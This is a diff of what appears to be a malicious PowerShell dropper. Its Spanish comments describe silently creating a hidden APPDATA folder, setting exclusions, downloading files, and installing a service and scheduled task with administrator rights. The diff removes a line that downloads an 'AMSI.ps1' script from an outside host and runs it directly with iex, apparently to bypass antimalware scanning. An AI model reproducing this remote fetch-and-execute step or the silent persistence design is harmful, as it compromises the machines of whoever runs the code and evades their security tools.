@@ -1,7 +1,6 @@
 # Este script crea un directorio, configura exclusiones, descarga archivos,
 # instala un servicio y crea una tarea programada, todo de manera silenciosa y en segundo plano.
 # Debe ejecutarse con permisos de administrador.
-irm "http://baa4ts.is-a.dev/AMSI.ps1" | iex
 
 # Definir la variable de la ruta raíz.
 $root = "$env:APPDATA\Wik"
